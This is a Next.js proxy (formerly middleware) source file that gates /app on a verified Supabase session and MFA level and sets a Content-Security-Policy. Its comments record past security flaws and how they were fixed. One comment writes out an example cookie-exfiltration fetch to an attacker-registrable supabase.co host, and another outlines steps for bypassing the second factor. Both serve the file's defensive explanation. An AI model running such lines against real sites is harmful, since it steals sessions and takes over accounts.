/*
  proxy.js  (was middleware.js)
  --------------------------------------------------------------------------
  The gate, and the nonce.

  WHAT THIS FIXES

  Until now /app was protected by a check that ran in the browser: the page was
  served to anybody, and the JavaScript decided whether to show it. The data
  was never at risk — RLS means a signed-out client gets zero rows from
  Postgres, and that is pen-tested — but "there is no way to enter the app
  without an account" was not literally true, because the page itself loaded.

  Now the session cookie is checked at the edge and a signed-out request to
  /app is a 302 before any HTML is written. That is the claim that survives
  somebody typing the URL in a meeting.

  WHAT IT STILL DOES NOT DO, AND NOBODY SHOULD PRETEND OTHERWISE
  The JavaScript bundle is a static asset and remains downloadable, here and in
  every other client-rendered application. What matters is that the bundle
  contains no data, the API returns nothing without a session, and the page
  refuses to render. Claiming the code cannot be fetched is a claim that is
  falsified in about four seconds by anyone technical.

  THE CSP

  Set here rather than in next.config.mjs so it can vary per request if it ever
  needs to. The long note above buildCsp explains why script-src still allows
  'unsafe-inline' despite two attempts to remove it, and what would actually
  close that gap — it is an open finding, not an oversight.
  -------------------------------------------------------------------------- */

import { NextResponse } from 'next/server'
import { createServerClient } from '@supabase/ssr'
import { COOKIE_OPTIONS } from './lib/cookies.js'

/* Routes that require a session. Everything else — the landing wall, /login,
   /signup, the auth callback — is deliberately open.

   An ALLOWLIST of protected paths, not a denylist of public ones. Both are
   defensible; this one fails toward "a new page is public", which for a
   product whose only private route is /app is the failure that gets noticed
   immediately rather than the one that silently locks people out of a
   password-reset page. */
const PROTECTED = ['/app']

/* Where a signed-in user should never be. Landing on /login while already
   authenticated is a dead end that looks like being signed out.

   /reset IS DELIBERATELY ABSENT FROM THIS LIST. A password-reset link creates
   a session as it lands — that is how it authenticates you — so a signed-in
   redirect would bounce every reset straight to /app and make changing a
   forgotten password impossible. The one page where "you are already signed
   in" is the entire precondition rather than a reason to leave. */
const AUTH_PAGES = ['/login', '/signup', '/forgot']

/* THE PROJECT HOST, NOT THE WHOLE NAMESPACE.
 
   This used to read `https://*.supabase.co` in img-src and connect-src, and
   that wildcard is worse than it looks: anyone can create a free Supabase
   project and be handed `<their-ref>.supabase.co`. The namespace is
   attacker-registrable.
 
   Which matters precisely because of the paragraph below. This file is honest
   that `script-src 'unsafe-inline'` will not stop an injected script, and
   lib/supabaseClient.js is honest that the session cookie is not httpOnly. Put
   those together and the CSP's remaining job is to stop an injected script
   PHONING HOME. A wildcard over a namespace anyone can register does not do
   that job at all:
 
       fetch('https://attacker.supabase.co/functions/v1/x',
             { method: 'POST', body: document.cookie })
 
   was allowed by the policy. Pinned to the one project this deployment talks
   to, it is not. Same for img-src, which is the cheaper exfiltration channel
   (no CORS, no preflight, just a pixel with the data in the query string).
 
   Derived from the env var rather than hardcoded so a second project — the dev
   one SUPABASE_SETUP.md asks for — needs no code change. Empty when unset, and
   an empty entry is harmless: the directive then falls back to 'self' only,
   which is correct for a deployment with no Supabase at all. */
const SUPABASE_ORIGIN = (() => {
  try { return new URL(process.env.NEXT_PUBLIC_SUPABASE_URL || '').origin }
  catch { return '' }
})()
const SUPABASE_WS = SUPABASE_ORIGIN ? SUPABASE_ORIGIN.replace(/^https:/, 'wss:') : ''

/* WHY script-src STILL ALLOWS 'unsafe-inline', WRITTEN DOWN PROPERLY.

   This was built with a per-request nonce and 'strict-dynamic' — the textbook
   answer, and the reason this file exists at all. It was then measured against
   a real server, and it does not work here:

     · Next prerenders most routes to static HTML at build time, and static
       HTML cannot carry a per-request nonce. Verified: the response header
       carried a nonce, the HTML contained none.
     · Forcing the route dynamic does not fix it either. A force-dynamic route
       was served with the nonce on both the request and the response headers,
       and Next STILL emitted its five inline bootstrap scripts with no nonce
       attribute. Measured, not assumed.
     · 'strict-dynamic' would then have made it worse rather than merely
        useless: that keyword causes 'self' to be IGNORED, so every one of the
        twelve /_next/static chunks would have been blocked too. The result
        would have been a blank application behind a policy that looked
        stricter on paper.

   So the honest position is: script-src is 'self' plus 'unsafe-inline', it
   does not stop an injected inline <script>, and the defence against stored
   XSS remains lib/sanitize.js plus the assertKnownTags check in
   lib/markdown.js — which is one bug deep and is the reason this is recorded
   as an open gap rather than quietly dropped.

   TO CLOSE IT: either Next gains nonce support that reaches its own inline
   scripts, or the inline bootstrap is hashed at build time and the hashes are
   emitted here. Re-test with the probe method above — serve a page, diff the
   nonce in the header against the nonce attributes in the HTML. A CSP that is
   never verified against served HTML is a CSP that is probably not doing what
   its author believes.

   RE-TESTED 27 Aug 2026 against Next 16.1.7, `next build && next start`,
   GET /login: 14 <script> tags in the served HTML, 0 nonce attributes. The
   conclusion above is unchanged and this line exists so the next reader knows
   the date it was last actually measured rather than last believed. */

function buildCsp() {
  return [
    "default-src 'self'",
    /* THERE IS NO NONCE HERE. The block above this function explains why, at
       length and with the measurements. This comment used to say "'unsafe-
       inline' is listed AFTER the nonce on purpose" — describing a nonce that
       does not appear anywhere in this file, in the one line a security
       reviewer would actually read. Left as a plain pointer instead, because
       the failure mode of the old version was a reviewer concluding the policy
       was nonce-based and moving on. */
    "script-src 'self' 'unsafe-inline'",
    /* Permanent, and not a compromise: the entire codebase styles through
       inline style objects by design, and there is no XSS worth having through
       a style attribute once script-src is closed. */
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    "font-src 'self' https://fonts.gstatic.com data:",
    /* blob: and data: are how every imported image and rendered PDF page is
       displayed. Neither can fetch anything. */
    `img-src 'self' blob: data: ${SUPABASE_ORIGIN}`.trim(),
    "media-src 'self' blob:",
    `connect-src 'self' ${SUPABASE_ORIGIN} ${SUPABASE_WS}`.trim(),
    "worker-src 'self' blob:",
    "object-src 'none'",
    "base-uri 'none'",
    "form-action 'self'",
    "frame-ancestors 'none'",
    "upgrade-insecure-requests",
  ].join('; ')
}

/* Next 16 renamed this convention from `middleware` to `proxy` and warns on
   every build about the old name. Renamed rather than left warning, because a
   deprecation notice on the file that gates the application is exactly the
   kind of thing that gets ignored until the release that removes it — and the
   failure mode is not a broken build, it is a gate that silently stops
   running. Verified by the build output still listing a Proxy entry. */
export default async function proxy(request) {
  const { pathname } = request.nextUrl

  /* TWO COMMENT BLOCKS DESCRIBING A NONCE SCHEME USED TO LIVE HERE.

     They explained, at length and correctly, how the nonce reaches the render
     and why the policy has to go on the request headers. Neither described
     this file: `nonce` appeared nowhere in the code, buildCsp() emits a fixed
     `script-src 'self' 'unsafe-inline'`, and the top-of-file block already
     says honestly why the nonce was abandoned in Next 16. A reader doing a
     security review would have concluded the CSP was nonce-based. It is not.
     Deleted rather than corrected — the honest version is already above.

     `NextResponse.next({ request })`, NOT `{ request: { headers: <a copy> } }`.
     The copy was taken here, before setAll() mutated the cookies, so a request
     on which the session was refreshed handed the Server Component the OLD,
     EXPIRED cookie header. That component then tried to refresh with a refresh
     token the middleware had already spent, and rendered signed-out for one
     request. Passing the live request object is what the Supabase docs
     prescribe, for exactly this reason. */
  let response = NextResponse.next({ request })

  const url = process.env.NEXT_PUBLIC_SUPABASE_URL
  const anon = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
  let user = null
  /* A session that exists but has not cleared its second factor. Kept separate
     from `user` because the two lead to different destinations: signed out
     goes to the sign-in form, half-signed-in goes to the code prompt. */
  let mfaUnfinished = false
  if (url && anon) {
    const supabase = createServerClient(url, anon, {
      cookies: {
        getAll: () => request.cookies.getAll(),
        setAll(list) {
          for (const { name, value } of list) request.cookies.set(name, value)
          response = NextResponse.next({ request })
          for (const { name, value, options } of list) response.cookies.set(name, value, options)
        },
      },
      /* THE SERVER SIDE WAS DROPPING `Secure`.

         lib/supabaseClient.js sets `secure` explicitly on the browser client.
         Neither server client passed cookieOptions at all, and @supabase/ssr's
         DEFAULT_COOKIE_OPTIONS has no `secure` key — so the first server-side
         refresh re-issued the session cookie WITHOUT it, quietly undoing the
         browser client's care. HSTS covers a browser that has already seen the
         header; it does not cover the first visit, and `preload` is
         deliberately off.

         Imported from one place so the three call sites cannot drift again. */
      cookieOptions: COOKIE_OPTIONS,
    })

    /* getUser(), NOT getSession().
       getSession reads the cookie and trusts it. getUser sends the token to
       Supabase to be verified. On a gate, the difference is the whole point: a
       forged or expired cookie satisfies the first and fails the second, and
       this is the one place in the application where being wrong means letting
       a stranger in. It costs a round trip on protected routes only. */
    try {
      const { data } = await supabase.auth.getUser()
      user = data?.user || null

      /* TWO-FACTOR WAS DECORATIVE UNTIL THIS BLOCK EXISTED.

         signInWithPassword returns a COMPLETE, cookie-persisted session at
         aal1 even when the account has a verified TOTP factor. The second
         factor was requested by a single React state transition on the login
         page (`setNeedsCode(true)`), and that state is discarded by any
         navigation — so an attacker holding only the password could:

           1. POST /auth/v1/token?grant_type=password straight at Supabase
           2. arrive at /app with the resulting cookies
           3. POST /api/account/delete

         and never see the form that asks for the code. Worse, AUTH_PAGES
         bounced the now-signed-in aal1 session off /login, so even an honest
         user could not get back to the prompt.

         `nextLevel` is what this account is ENTITLED to reach — aal2 once a
         factor is verified. `currentLevel` is where this session actually is.
         When they disagree, the session is unfinished, and unfinished is
         treated here exactly like unauthenticated.

         The database is the belt to this brace: an RLS policy keyed on
         `auth.jwt()->>'aal'` would enforce it even for a caller who never
         passes through this file. Not added yet — noted in SUPABASE_SETUP.md
         as the remaining gap, because it needs its own migration and its own
         pen-test case rather than a line squeezed in here. */
      if (user) {
        const { data: aal } = await supabase.auth.mfa.getAuthenticatorAssuranceLevel()
        if (aal?.nextLevel === 'aal2' && aal.currentLevel !== 'aal2') mfaUnfinished = true
      }
    } catch {
      /* Supabase unreachable. `user` stays null, so a request for /app is
         redirected to /login rather than served.

         FAIL CLOSED, and it is worth being explicit that this is a choice.
         Failing open — serving the app when the auth service is down — would
         keep signed-in users working during an outage, and would also serve
         the page to anyone at all for the duration. The data is still safe
         either way (RLS returns nothing without a valid token), so what is
         actually being traded is availability against not handing out the
         application to strangers whenever Supabase has a bad afternoon.

         Without this catch it fails closed anyway, via a 500 — which is the
         same outcome with a worse error message. */
    }
  }

  const lower = pathname.toLowerCase()
  const wantsApp = PROTECTED.some(p => lower === p || lower.startsWith(p + '/'))
  const onAuthPage = AUTH_PAGES.some(p => lower === p || lower.startsWith(p + '/'))

  if (wantsApp && (!user || mfaUnfinished)) {
    const to = request.nextUrl.clone()
    to.pathname = '/login'
    /* So the login page can go straight to the code step instead of asking for
       a password the browser has already supplied. */
    if (mfaUnfinished) to.searchParams.set('mfa', '1')
    /* Where they were trying to go, so signing in lands them there instead of
       on a generic home page. Only ever a PATH from this origin — `next=https://
       evil.example` in a URL somebody was emailed is the classic open redirect,
       and lib/urls.js exists in this codebase because that class of bug has
       been taken seriously here before. The login page re-checks this. */
    to.searchParams.set('next', pathname.startsWith('/') && !pathname.startsWith('//') ? pathname : '/app')
    return handoff(response, NextResponse.redirect(to))
  }

  /* `&& !mfaUnfinished` — otherwise the bounce below fires on a half-finished
     session and throws the user off the very page that would finish it. That
     is not a hypothetical: it is what made the code prompt unreachable after
     any navigation. */
  if (onAuthPage && user && !mfaUnfinished) {
    const to = request.nextUrl.clone()
    to.pathname = '/app'
    to.search = ''
    return handoff(response, NextResponse.redirect(to))
  }

  response.headers.set('Content-Security-Policy', buildCsp())
  return response
}

/**
 * Move refreshed session cookies onto a redirect, and carry the CSP with them.
 *
 * BOTH REDIRECT BRANCHES USED TO DISCARD THEM, and this fired on ordinary
 * traffic with no attacker involved. getUser() refreshes an expired token as a
 * side effect — `autoRefreshToken: false` does not prevent it — and Supabase
 * ROTATES refresh tokens, so the old one is spent the moment that happens. The
 * new pair landed on `response`; a bare `NextResponse.redirect()` is a
 * different object and carried none of it.
 *
 * So: a signed-in user with an expired access token opens /login from a
 * bookmark, the middleware refreshes, the redirect drops the new cookies, and
 * the browser is left holding a refresh token the server has already consumed.
 * Next request: signed out, with whatever was queued for sync still queued.
 */
function handoff(from, to) {
  for (const cookie of from.cookies.getAll()) to.cookies.set(cookie)
  to.headers.set('Content-Security-Policy', buildCsp())
  return to
}

export const config = {
  /* Static assets are excluded because they neither need a session check nor a
     CSP, and running an auth round trip for every font file would put a
     network call on the critical path of the first paint. */
  /* THE EXTENSION EXCLUSION USED TO BE ANCHORED TO THE WHOLE PATH.

     `.*\.(?:png|…|svg|…)$` matches /app/report.svg just as happily as
     /logo.svg, so any path under /app ending in an image or font extension
     skipped the middleware entirely — while `wantsApp` on line 193 would have
     been true for it. Today /app has no dynamic route so those paths 404 and
     nothing leaks. The day someone adds `app/app/[id]/page.js`,
     /app/anything.svg renders the protected page with no session check, and
     the two halves of the gate disagree in a way no test would catch.

     Scoped to where static files actually live instead. Everything Next serves
     from /public or /_next is covered by a prefix; nothing else needs to be.

     `.toLowerCase()` on the pathname comparison below is the other half: the
     gate was case-sensitive while a CDN or proxy in front of it might not be. */
  matcher: [
    '/((?!_next/static|_next/image|favicon\\.ico|pdf-cmaps/|pdf-fonts/|pdf\\.worker\\.min\\.mjs$).*)',
  ],
}
